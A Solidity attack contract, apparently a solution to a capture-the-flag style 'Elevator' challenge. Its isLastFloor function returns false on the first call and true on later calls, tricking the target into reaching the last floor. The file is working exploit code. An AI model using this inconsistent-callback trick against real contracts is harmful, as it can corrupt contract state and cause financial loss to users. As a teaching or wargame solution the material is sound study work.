// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract BuildingAttack {
    bool called = false;

    function goTo(address elevator, uint256 _floor) external {
        Elevator(elevator).goTo(_floor);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!called) {
            called = true;
            return false;
        }
        return true;
    }
}
